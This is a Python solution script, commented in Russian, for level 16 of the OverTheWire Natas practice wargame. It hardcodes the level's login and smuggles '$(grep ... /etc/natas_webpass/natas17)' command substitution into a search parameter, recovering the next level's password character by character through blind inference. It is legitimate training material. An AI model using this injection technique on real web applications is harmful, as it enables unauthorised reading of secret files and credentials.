import requests

# Ваши учётные данные для Natas16
username = 'natas16'
password_natas16 = 'Xm6XEeRN3zsGjRDqBPmuqAVV65k7e3Gb'
url = f'http://{username}:{password_natas16}@natas16.natas.labs.overthewire.org/'

# Строка, которая появляется при пустом выводе grep (успешная инъекция)
# Если скрипт не находит символы, попробуйте изменить на '<pre>\n</pre>'
trueStr = 'Output:\n<pre>\n</pre>'

chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
exist = ''

print("Ищем используемые символы...")
for x in chars:
    # Инъекция: если символ есть в пароле, grep вернёт пароль, и Fridays не найдётся -> пустая страница
    payload = f"$(grep {x} /etc/natas_webpass/natas17)Fridays"
    r = requests.get(url, params={'needle': payload})
    if trueStr in r.text:
        exist += x
        print(f"Символ {x} найден в пароле!")

print(f"Используемые символы: {exist}")

if not exist:
    print("Не найдено ни одного символа. Проверьте trueStr, URL и пароль.")
    # Для отладки можно вывести ответ сервера на тестовый запрос:
    # test_payload = "$(grep a /etc/natas_webpass/natas17)Fridays"
    # r = requests.get(url, params={'needle': test_payload})
    # print(r.text[:500])
    exit()

print("Начинаем подбор пароля...")
password = ''
for i in range(32):
    for c in exist:
        # Проверяем префикс пароля
        payload = f"$(grep ^{password}{c} /etc/natas_webpass/natas17)Fridays"
        r = requests.get(url, params={'needle': payload})
        if trueStr in r.text:
            password += c
            print(f"Пароль: {password}{'*' * (32 - len(password))}")
            break

print(f"Готово! Пароль для Natas17: {password}")